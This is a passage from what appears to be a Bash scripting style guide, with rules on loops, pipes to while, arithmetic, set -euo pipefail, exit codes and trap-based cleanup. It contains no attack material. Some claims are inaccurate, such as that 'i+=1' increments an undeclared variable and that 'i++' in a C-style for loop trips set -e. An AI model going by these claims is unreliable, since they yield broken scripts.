  while IFS= read -r line; do
    # Skip empty lines
    [[ -z "$line" ]] && continue

    # Skip comments
    [[ "$line" =~ ^# ]] && continue

    ((line_count+=1))
    ((VERBOSE)) && info "  Line $line_count: $line"

    # Process line (with retry)
    if ! retry_with_backoff process_line "$line"; then
      error "Failed to process line $line_count in $file"
      return 1
    fi
  done < "$file"

  success "Processed $line_count lines from: $file"
  return 0
}

process_line() {
  local -- line="$1"
  # Line processing logic here
  sleep 0.1  # Simulate work
}

# Collect files matching patterns
collect_files() {
  local -a files=()
  local -- pattern file

  # Iterate over each pattern
  for pattern in "${INPUT_PATTERNS[@]}"; do
    ((VERBOSE)) && info "Searching for pattern: $pattern"

    # Iterate over glob matches
    for file in $pattern; do
      # Check if glob matched anything
      if [[ ! -e "$file" ]]; then
        ((VERBOSE)) && warn "No matches for pattern: $pattern"
        continue
      fi

      if [[ -f "$file" ]]; then
        files+=("$file")
      fi
    done
  done

  # Check if we found any files
  if [[ ${#files[@]} -eq 0 ]]; then
    error 'No files found matching patterns'
    return 1
  fi

  # Return files (print to stdout)
  printf '%s\n' "${files[@]}"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments with while loop
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -r|--retries)
        noarg "$@"
        shift
        MAX_RETRIES="$1"
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR="$1"
        ;;

      -h|--help)
        echo 'Usage: script.sh [OPTIONS] PATTERN...'
        echo 'Options:'
        echo '  -v, --verbose    Verbose output'
        echo '  -n, --dry-run    Dry-run mode'
        echo '  -r, --retries N  Max retry attempts'
        echo '  -o, --output DIR Output directory'
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option: $1"
        ;;

      *)
        INPUT_PATTERNS+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  INPUT_PATTERNS+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN MAX_RETRIES OUTPUT_DIR
  readonly -a INPUT_PATTERNS

  # Validate
  if [[ ${#INPUT_PATTERNS[@]} -eq 0 ]]; then
    die 22 'No file patterns specified'
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Patterns: ${INPUT_PATTERNS[*]}"
    info "Max retries: $MAX_RETRIES"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled'
  fi

  # Collect matching files
  local -a files
  if ! readarray -t files < <(collect_files); then
    die 1 'Failed to collect files'
  fi

  info "Found ${#files[@]} files to process"

  # Process each file with for loop
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${files[@]}"; do
    if process_file "$file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - iterating over unquoted string
files_str="file1.txt file2.txt file with spaces.txt"
for file in $files_str; do  # Word splitting!
  echo "$file"
done

# ✓ Correct - iterate over array
files=('file1.txt' 'file2.txt' 'file with spaces.txt')
for file in "${files[@]}"; do
  echo "$file"
done

# ✗ Wrong - parsing ls output
for file in $(ls *.txt); do  # NEVER parse ls!
  process "$file"
done

# ✓ Correct - use glob directly
for file in *.txt; do
  process "$file"
done

# ✗ Wrong - pipe to while (subshell issue)
count=0
cat file.txt | while read -r line; do
  ((count+=1))
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution
count=0
while read -r line; do
  ((count+=1))
done < <(cat file.txt)
echo "$count"  # Correct value

# ✗ Wrong - unquoted array in for loop
array=('item 1' 'item 2')
for item in ${array[@]}; do  # Unquoted!
  echo "$item"
done

# ✓ Correct - quoted array expansion
for item in "${array[@]}"; do
  echo "$item"
done

# ✗ Wrong - C-style loop with ++
for ((i=0; i<10; i++)); do  # Fails with set -e when i=0!
  echo "$i"
done

# ✓ Correct - use +=1 instead
for ((i=0; i<10; i+=1)); do
  echo "$i"
done

# ✗ Wrong - break with no argument (ambiguous in nested loops)
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break  # Breaks inner loop only - unclear
    fi
  done
done

# ✓ Correct - explicit break level
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break 2  # Break both loops - clear intent
    fi
  done
done

# ✗ Wrong - modifying array during iteration
array=(a b c d)
for item in "${array[@]}"; do
  array+=("$item")  # Dangerous - modifies array being iterated!
done

# ✓ Correct - create new array
original=(a b c d)
modified=()
for item in "${original[@]}"; do
  modified+=("$item" "$item")  # Safe - different array
done

# ✗ Wrong - seq for iteration (external command)
for i in $(seq 1 10); do  # Unnecessary external command
  echo "$i"
done

# ✓ Correct - use brace expansion
for i in {1..10}; do
  echo "$i"
done

# ✗ Wrong - reading file without preserving backslashes
while read line; do  # Missing -r flag
  echo "$line"
done < file.txt

# ✓ Correct - always use -r with read
while IFS= read -r line; do
  echo "$line"
done < file.txt

# ✗ Wrong - infinite loop without safety check
while true; do
  process_item
  # No break condition - runs forever!
done

# ✓ Correct - infinite loop with exit condition
iteration=0
max_iterations=1000
while true; do
  process_item

  ((iteration+=1))
  if ((iteration >= max_iterations)); then
    warn 'Max iterations reached'
    break
  fi
done
```

**Edge cases:**

**1. Empty arrays:**

```bash
# Empty array is safe to iterate
empty=()

# Zero iterations - no errors
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done
```

**2. Arrays with empty elements:**

```bash
# Array with empty string element
array=('' 'item2' '' 'item4')

# Iterates 4 times, including empty strings
for item in "${array[@]}"; do
  echo "Item: [$item]"
done
# Output:
# Item: []
# Item: [item2]
# Item: []
# Item: [item4]
```

**3. Glob with no matches:**

```bash
# With nullglob enabled
shopt -s nullglob

for file in /nonexistent/*.txt; do
  echo "$file"  # Never executes if no matches
done

# Without nullglob
shopt -u nullglob

for file in /nonexistent/*.txt; do
  # Executes once with literal: /nonexistent/*.txt
  if [[ ! -e "$file" ]]; then
    echo 'No matches'
    break
  fi
  echo "$file"
done
```

**4. Loop variable scope:**

```bash
# Loop variables are not local
for i in {1..5}; do
  echo "$i"
done
echo "i is still available: $i"  # Prints: 5

# Make loop variable local explicitly if needed
process_items() {
  local -i i

  for i in {1..5}; do
    echo "$i"
  done
  # i goes out of scope here
}
```

**5. Reading empty files:**

```bash
# Empty file
touch empty.txt

count=0
while read -r line; do
  ((count+=1))
done < empty.txt

echo "Count: $count"  # Output: 0 (zero iterations)
```

**Summary:**

- **For loops** - best for arrays, globs, and known ranges
- **While loops** - best for reading input, argument parsing, and condition-based iteration
- **Until loops** - rarely used, prefer while with opposite condition
- **Always quote arrays** - `"${array[@]}"` for safe iteration
- **Use process substitution** - `< <(command)` to avoid subshell in while loops
- **Prefer arrays over strings** - for file lists and collections
- **Never parse ls** - use glob patterns or find with process substitution
- **Use i+=1 not i++** - ++ returns original value, fails with set -e when 0
- **Break and continue** - for early exit and conditional skipping
- **Specify break level** - `break 2` for nested loops
- **IFS= read -r** - always use with while loops reading input
- **Check glob matches** - with nullglob or explicit check

**Key principle:** Choose the loop type that matches your iteration pattern: for loops for collections and ranges, while loops for streaming input and conditions. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ explicit loop control with break/continue for clarity. The loop type should make your intent immediately obvious to readers.


---


**Rule: BCS0704**

### Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead. This is one of the most common and insidious bugs in Bash scripts.**

**Rationale:**

- **Variable Persistence**: Pipes create subshells; variables modified inside don't persist outside the loop
- **Debugging Difficulty**: The script appears to work but counters stay at 0, arrays stay empty
- **Silent Failure**: No error messages - script continues with wrong values
- **Process Substitution Fixes**: `< <(command)` runs loop in current shell, variables persist
- **Readarray Alternative**: For simple line collection, `readarray` is cleaner and faster
- **Set -e Interaction**: Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

When you pipe to while, Bash creates a subshell for the while loop. Any variable modifications happen in that subshell and are lost when the pipe ends.

```bash
# ✗ WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
# Variable changes were lost!
```

**Why this happens:**

```bash
# Pipe creates process tree:
#   Parent shell (count=0)
#      |
#      └─> Subshell (while loop)
#            - Inherits count=0
#            - Modifies count (1, 2, 3)
#            - Subshell exits
#            - Changes discarded!
#      |
#   Back to parent (count still 0)
```

**Solution 1: Process substitution (most common)**

```bash
# ✓ CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
# ✓ CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

# Now process array
declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)

# Iterate if needed
local -- line
for line in "${lines[@]}"; do
  echo "$line"
done
```

**Solution 3: Here-string (for single variables)**

```bash
# ✓ CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Complete examples:**

**Example 1: Counting matching lines**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✗ WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file="$1"
  local -i error_count=0

  # Pipe creates subshell!
  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    echo "Found: $line"
    ((error_count+=1))
  done

  echo "Errors: $error_count"  # Always 0!
  return "$error_count"  # Returns 0 even if errors found!
}

# ✓ CORRECT - Process substitution
count_errors_correct() {
  local -- log_file="$1"
  local -i error_count=0

  # Process substitution keeps loop in current shell
  while IFS= read -r line; do
    echo "Found: $line"
    ((error_count+=1))
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
  return "$error_count"
}

# ✓ ALSO CORRECT - Using wc (when only count matters)
count_errors_simple() {
  local -- log_file="$1"
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
  return "$error_count"
}

main() {
  local -- test_log='/var/log/app.log'

  count_errors_correct "$test_log"
}

main "$@"

#fin
```

**Example 2: Building array from command output**

```bash
# ✗ WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  # Pipe creates subshell!
  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
  # Array modifications lost!
}

# ✓ CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct count!
  printf '%s\n' "${users[@]}"
}

# ✓ ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users

  # Read usernames directly into array
  readarray -t users < <(getent passwd | cut -d: -f1)

  echo "Users: ${#users[@]}"
  printf '%s\n' "${users[@]}"
}
```

**Example 3: Processing files with state**

```bash
# ✗ WRONG - State variables lost
process_files_wrong() {
  local -i total_size=0
  local -i file_count=0

  # Pipe creates subshell!
  find /data -type f | while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    ((total_size+=size))
    ((file_count+=1))
  done

  echo "Files: $file_count, Total: $total_size"
  # Both 0 - variables lost!
}

# ✓ CORRECT - Process substitution
process_files_correct() {
  local -i total_size=0
  local -i file_count=0

  while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    ((total_size+=size))
    ((file_count+=1))
  done < <(find /data -type f)

  echo "Files: $file_count, Total: $total_size"
  # Correct values!
}
```

**Example 4: Multi-variable read**

```bash
# ✗ WRONG - Associative array stays empty
parse_config_wrong() {
  local -A config=()

  # Pipe creates subshell!
  cat config.conf | while IFS='=' read -r key value; do
    config[$key]="$value"
  done

  # config is empty here!
  echo "Config entries: ${#config[@]}"  # 0
}

# ✓ CORRECT - Process substitution
parse_config_correct() {
  local -A config=()

  while IFS='=' read -r key value; do
    # Skip comments and empty lines
    [[ "$key" =~ ^[[:space:]]*# ]] && continue
    [[ -z "$key" ]] && continue

    config[$key]="$value"
  done < <(cat config.conf)

  # config has values!
  echo "Config entries: ${#config[@]}"

  # Display config
  local -- k
  for k in "${!config[@]}"; do
    echo "$k = ${config[$k]}"
  done
}
```

**When readarray is better:**

```bash
# If you just need lines in an array, use readarray

# ✓ BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

# Process array
local -- line
for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: $line"
done

# ✓ BEST - readarray with null-delimited input
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

# Safe iteration (handles spaces in filenames)
local -- file
for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Complete working example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Analyze log file with process substitution
analyze_log() {
  local -- log_file="$1"

  local -i error_count=0
  local -i warn_count=0
  local -i total_lines=0
  local -a error_lines=()

  # Process substitution - variables persist
  while IFS= read -r line; do
    ((total_lines+=1))

    if [[ "$line" =~ ERROR ]]; then
      ((error_count+=1))
      error_lines+=("$line")
    elif [[ "$line" =~ WARN ]]; then
      ((warn_count+=1))
    fi
  done < <(cat "$log_file")

  # All counters work correctly!
  echo "Analysis of $log_file:"
  echo "  Total lines: $total_lines"
  echo "  Errors: $error_count"
  echo "  Warnings: $warn_count"

  if ((error_count > 0)); then
    echo ""
    echo "Error lines:"
    printf '  %s\n' "${error_lines[@]}"
  fi
}

# Collect configuration with readarray
load_config() {
  local -- config_file="$1"
  local -a config_lines
  local -A config=()

  # Use readarray to collect lines
  readarray -t config_lines < <(grep -v '^#' "$config_file" | grep -v '^[[:space:]]*$')

  # Parse array
  local -- line key value
  for line in "${config_lines[@]}"; do
    IFS='=' read -r key value <<< "$line"
    config[$key]="$value"
  done

  # Config populated correctly
  echo "Configuration loaded: ${#config[@]} entries"
  local -- k
  for k in "${!config[@]}"; do
    echo "  $k = ${config[$k]}"
  done
}

# Process files safely
process_directory() {
  local -- dir="$1"
  local -a files

  # Collect files with readarray
  readarray -d '' -t files < <(find "$dir" -type f -name '*.txt' -print0)

  local -- file
  local -i processed=0

  for file in "${files[@]}"; do
    echo "Processing: $file"
    # Process file
    ((processed+=1))
  done

  echo "Processed $processed files"
}

main() {
  analyze_log '/var/log/app.log'
  load_config '/etc/app/config.conf'
  process_directory '/data'
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  ((count+=1))
done
echo "$count"  # Still 0!

# ✓ CORRECT - Process substitution
while read -r line; do
  ((count+=1))
done < <(cat file.txt)
echo "$count"  # Correct!

# ✗ WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
echo "${#files[@]}"  # Still 0!

# ✓ CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)
echo "${#files[@]}"  # Correct!

# ✗ WRONG - Pipe to while modifying associative array
cat config | while IFS='=' read -r key val; do
  config[$key]="$val"
done
# config is empty!

# ✓ CORRECT - Process substitution
while IFS='=' read -r key val; do
  config[$key]="$val"
done < <(cat config)
# config has values!

# ✗ WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

# ✓ CORRECT - Use return value or process substitution
if grep -q ERROR log; then
  has_errors=1
fi
# Or:
while read -r line; do
  has_errors=1
done < <(grep ERROR log)

# ✗ WRONG - Complex pipeline with state
cat file | grep pattern | sort | while read -r line; do
  ((count+=1))
  data+=("$line")
done
# count=0, data=() - both lost!

# ✓ CORRECT - Process substitution with pipeline
while read -r line; do
  ((count+=1))
  data+=("$line")
done < <(cat file | grep pattern | sort)
# Variables persist!
```

**Edge cases:**

**1. Empty input:**

```bash
# Process substitution handles empty input correctly
declare -i count=0

while read -r line; do
  ((count+=1))
done < <(echo -n "")  # No output

echo "Count: $count"  # 0 - correct (no lines)
```

**2. Command failure in process substitution:**

```bash
# With set -e, command failure is detected
while read -r line; do
  process "$line"
done < <(failing_command)  # Script exits if failing_command fails
```

**3. Very large output:**

```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line
while read -r line; do
  process "$line"  # Processes one at a time
done < <(cat huge_file)  # Lower memory usage
```

**4. Null-delimited input (filenames with newlines):**

```bash
# Use -d '' for null-delimited
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Testing the subshell issue:**

```bash
# Demonstrate the problem
test_pipe_subshell() {
  local -i count=0

  # This fails
  echo "test" | while read -r line; do
    count=1
  done

  if ((count == 0)); then
    echo "FAIL: Pipe created subshell, count not updated"
  else
    echo "PASS: Count was updated"
  fi
}

# Demonstrate the solution
test_process_substitution() {
  local -i count=0

  # This works
  while read -r line; do
    count=1
  done < <(echo "test")

  if ((count == 1)); then
    echo "PASS: Process substitution kept variables"
  else
    echo "FAIL: Count not updated"
  fi
}

test_pipe_subshell        # Shows the problem
test_process_substitution # Shows the solution
```

**Summary:**

- **Never pipe to while** - creates subshell, variables don't persist
- **Use process substitution** - `while read; done < <(command)` - variables persist
- **Use readarray** - `readarray -t array < <(command)` - simple and efficient
- **Use here-string** - `while read; done <<< "$var"` - when input is in variable
- **Subshell variables are lost** - any modifications disappear when pipe ends
- **Debugging is hard** - script appears to work but uses wrong values
- **Always test with data** - empty counters/arrays indicate subshell problem

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. This is not a style preference - it's about correctness. If you find `| while read` in code, it's almost certainly a bug waiting to manifest.


---


**Rule: BCS0705**

### Arithmetic Operations

**Declare integer variables explicitly:**

\`\`\`bash
# Always declare integer variables with -i flag
declare -i i j result count total

# Or declare with initial value
declare -i counter=0
declare -i max_retries=3
\`\`\`

**Rationale for `declare -i`:**
- **Automatic arithmetic context**: All assignments become arithmetic (no need for `$(())`)
- **Type safety**: Helps catch errors when non-numeric values assigned
- **Performance**: Slightly faster for repeated arithmetic operations
- **Clarity**: Signals to readers that variable holds numeric values

**Increment operations:**

\`\`\`bash
# ✓ PREFERRED: Simple increment (works with or without declare -i)
i+=1              # Clearest, most readable
((i+=1))          # Also safe, always returns 0 (success)

# ✓ SAFE: Pre-increment (returns value AFTER increment)
((++i))           # Returns new value, safe with set -e

# ✗ DANGEROUS: Post-increment (returns value BEFORE increment)
((i++))           # AVOID! Returns old value
                  # If i=0, returns 0 (false), triggers set -e exit!
\`\`\`

**Why `((i++))` is dangerous:**

\`\`\`bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (the old value), which is "false"
         # Script exits here with set -e!
         # i now equals 1, but we never reach next line

echo "This never executes"
\`\`\`

**Safe demonstration:**

\`\`\`bash
#!/usr/bin/env bash
set -e

# ✓ Safe patterns
i=0
i+=1      # i=1, no exit
echo "i=$i"

j=0
((++j))   # j=1, returns 1 (true), no exit
echo "j=$j"

k=0
((k+=1))  # k=1, returns 0 (always success), no exit
echo "k=$k"
\`\`\`

**Arithmetic expressions:**

\`\`\`bash
# In (()) - no $ needed for variables
((result = x * y + z))
((i = j * 2 + 5))
((total = sum / count))

# With $(()), for use in assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
args=($((count - 1)))  # In array context
\`\`\`

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` | Addition | `((i = a + b))` |
| `-` | Subtraction | `((i = a - b))` |
| `*` | Multiplication | `((i = a * b))` |
| `/` | Integer division | `((i = a / b))` |
| `%` | Modulo (remainder) | `((i = a % b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `++` / `--` | Increment/Decrement | Use `i+=1` instead |
| `+=` / `-=` | Compound assignment | `((i+=5))` |

**Arithmetic conditionals:**

\`\`\`bash
# Use (()) for arithmetic comparisons
if ((i < j)); then
  echo 'i is less than j'
fi

((count > 0)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'

# All C-style operators work
((i >= 10)) && echo 'Ten or more'
((i <= 5)) || echo 'More than five'
((i == j)) && echo 'Equal'
((i != j)) && echo 'Not equal'
\`\`\`

**Comparison operators in (()):**

| Operator | Meaning |
|----------|---------|
| `<` | Less than |
| `<=` | Less than or equal |
| `>` | Greater than |
| `>=` | Greater than or equal |
| `==` | Equal |
| `!=` | Not equal |

**Complex expressions:**

\`\`\`bash
# Parentheses for grouping
((result = (a + b) * (c - d)))

# Multiple operations
((total = sum + count * average / 2))

# Ternary operator (bash 5.2+)
((max = a > b ? a : b))

# Bitwise operations
((flags = flag1 | flag2))  # Bitwise OR
((masked = value & 0xFF))  # Bitwise AND
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - using [[ ]] for arithmetic
[[ "$count" -gt 10 ]]  # Verbose, old-style

# ✓ Correct - use (())
((count > 10))

# ✗ Wrong - post-increment
((i++))  # Dangerous with set -e when i=0

# ✓ Correct - use +=1
i+=1

# ✗ Wrong - expr command (slow, external)
result=$(expr $i + $j)

# ✓ Correct - use $(()) or (())
result=$((i + j))
((result = i + j))

# ✗ Wrong - $ inside (()) on left side
((result = $i + $j))  # Unnecessary $

# ✓ Correct - no $ inside (())
((result = i + j))

# ✗ Wrong - quotes around arithmetic
result="$((i + j))"  # Unnecessary quotes

# ✓ Correct - no quotes needed
result=$((i + j))
\`\`\`

**Integer division gotcha:**

\`\`\`bash
# Integer division truncates (rounds toward zero)
((result = 10 / 3))  # result=3, not 3.333...
((result = -10 / 3)) # result=-3, not -3.333...

# For floating point, use bc or awk
result=$(bc <<< "scale=2; 10 / 3")  # result=3.33
result=$(awk 'BEGIN {print 10/3}')   # result=3.33333
\`\`\`

**Practical examples:**

\`\`\`bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0
declare -i max_attempts=5
while ((attempts < max_attempts)); do
  if process_item; then
    break
  fi
  attempts+=1
  ((attempts < max_attempts)) && sleep 1
done
((attempts >= max_attempts)) && die 1 'Max attempts reached'

# Percentage calculation
declare -i total=100
declare -i completed=37
declare -i percentage=$((completed * 100 / total))
echo "Progress: $percentage%"
\`\`\`


---


**Rule: BCS0801**

### Exit on Error
```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Detailed explanation:**

- **`set -e`** (errexit): Script exits immediately if any command returns non-zero
- **`set -u`** (nounset): Exit if referencing undefined variables
- **`set -o pipefail`**: Pipeline fails if any command in pipe fails (not just last)

**Rationale:** These flags turn Bash from "permissive" to "strict mode":
- Catches errors immediately instead of continuing with bad state
- Prevents cascading failures
- Makes scripts behave more like compiled languages

**Common patterns for handling expected failures:**

```bash
# Pattern 1: Allow specific command to fail
command_that_might_fail || true

# Pattern 2: Capture exit code
if command_that_might_fail; then
  echo "Success"
else
  echo "Expected failure occurred"
fi

# Pattern 3: Temporarily disable errexit
set +e
risky_command
set -e

# Pattern 4: Check if variable exists before using
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Important gotchas:**

```bash
# ✗ This will exit even though you check the result
result=$(failing_command)  # Script exits here with set -e
if [[ -n "$result" ]]; then  # Never reached
  echo "Never gets here"
fi

# ✓ Correct - disable errexit for this command
set +e
result=$(failing_command)
set -e
if [[ -n "$result" ]]; then
  echo "Now this works"
fi

# ✓ Alternative - check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
else
  echo "Command failed, that's okay"
fi
```

**When to disable these flags:**
- Interactive scripts where user errors should be recoverable
- Scripts that intentionally try multiple approaches
- During cleanup operations that might fail

**Best practice:** Keep them enabled for most scripts. Disable only when absolutely necessary and re-enable immediately after.


---


**Rule: BCS0802**

### Exit Codes

**Standard implementation:**
```bash
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
die 0                    # Success (or use `exit 0`)
die 1                    # Exit 1 with no error message
die 1 'General error'    # General error
die 2 'Missing argument' # Missing argument
die 22 'Invalid option'  # Invalid argument
```

**Standard exit codes and their meanings:**

| Code | Meaning | When to Use |
|------|---------|-------------|
| 0 | Success | Command completed successfully |
| 1 | General error | Catchall for general errors |
| 2 | Misuse of shell builtin | Missing keyword/command, permission denied |
| 22 | Invalid argument | Invalid option provided (EINVAL) |
| 126 | Command cannot execute | Permission problem or not executable |
| 127 | Command not found | Possible typo or PATH issue |
| 128+n | Fatal error signal n | e.g., 130 = Ctrl+C (128+SIGINT) |
| 255 | Exit status out of range | Use 0-255 only |

**Common custom codes:**
```bash
die 0 'Success message'         # Success (informational)
die 1 'Generic failure'         # General failure
die 2 'Missing required file'   # Usage error
die 3 'Configuration error'     # Config file issue
die 4 'Network error'           # Connection failed
die 5 'Permission denied'       # Insufficient permissions
die 22 "Invalid option '$1'"    # Bad argument (EINVAL)
```

**Rationale:**
- **0 = success**: Universal convention across all Unix/Linux tools
- **1 = general error**: Safe catchall when specific code doesn't matter
- **2 = usage error**: Matches bash built-in behavior for argument errors
- **22 = EINVAL**: Standard errno for "Invalid argument"
- **Avoid high numbers**: Use 1-125 for custom codes to avoid signal conflicts

**Best practices:**
```bash
# Define exit codes as constants for readability
readonly -i SUCCESS=0
readonly -i ERR_GENERAL=1
readonly -i ERR_USAGE=2
readonly -i ERR_CONFIG=3
readonly -i ERR_NETWORK=4

die "$ERR_CONFIG" 'Failed to load configuration file'
```

**Checking exit codes:**
```bash
if command; then
  echo "Success"
else
  exit_code=$?
  case $exit_code in
    1) echo "General failure" ;;
    2) echo "Usage error" ;;
    *) echo "Unknown error: $exit_code" ;;
  esac
fi
```


---


**Rule: BCS0803**

### Trap Handling

**Standard cleanup pattern:**

\`\`\`bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir"
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile"

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
\`\`\`

**Rationale for trap handling:**
- **Resource cleanup**: Ensures temp files, locks, processes are cleaned up even on errors
- **Signal handling**: Responds to Ctrl+C (SIGINT), kill (SIGTERM), and normal exit
- **Preserves exit code**: `$?` captures original exit status
- **Prevents partial state**: Cleanup runs regardless of how script exits

**Understanding trap signals:**

| Signal | Meaning | When Triggered |
|--------|---------|----------------|
| `EXIT` | Script exit | Always runs on script exit (normal or error) |
| `SIGINT` | Interrupt | User presses Ctrl+C |
| `SIGTERM` | Terminate | `kill` command (default signal) |
| `ERR` | Error | Command fails (with `set -e`) |
| `DEBUG` | Debug | Before every command (debugging only) |

**Common trap patterns:**

**1. Temp file cleanup:**
\`\`\`bash
# Create temp file
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# Script uses temp_file
echo "data" > "$temp_file"
# ...

# Cleanup happens automatically on exit
\`\`\`

**2. Temp directory cleanup:**
\`\`\`bash
# Create temp directory
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT

# Use temp directory
extract_archive "$archive" "$temp_dir"
# ...

# Directory automatically cleaned up on exit
\`\`\`

**3. Lockfile cleanup:**
\`\`\`bash
lockfile="/var/lock/myapp.lock"

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists: $lockfile)"
  fi
  echo $$ > "$lockfile" || die 1 'Failed to create lock file'
  trap 'rm -f "$lockfile"' EXIT
}

acquire_lock
# Script runs exclusively
# Lock released automatically on exit
\`\`\`

**4. Process cleanup:**
\`\`\`bash
# Start background process
long_running_command &
bg_pid=$!

# Ensure background process is killed on exit
trap 'kill $bg_pid 2>/dev/null' EXIT

# Script continues
# Background process killed automatically on exit
\`\`\`

**5. Comprehensive cleanup function:**
\`\`\`bash
#!/usr/bin/env bash
set -euo pipefail

# Global cleanup resources
declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Kill background processes
